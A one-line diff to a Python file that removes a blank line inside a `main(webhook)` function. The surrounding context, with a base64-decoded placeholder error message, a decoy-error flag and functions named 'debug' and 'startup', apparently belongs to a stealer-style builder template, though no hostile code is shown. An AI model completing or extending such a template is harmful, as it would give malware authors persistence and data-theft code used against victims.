@@ -12,7 +12,6 @@ __USE_ERROR_MESSAGE__ = False
 __ERROR_MESSAGE__ = __import__("base64").b64decode("&ERROR_MESSAGE_ENC&").decode("utf-8")
 
 def main(webhook: str) -> None:   
-
     funcs = [
         debug,
         startup,
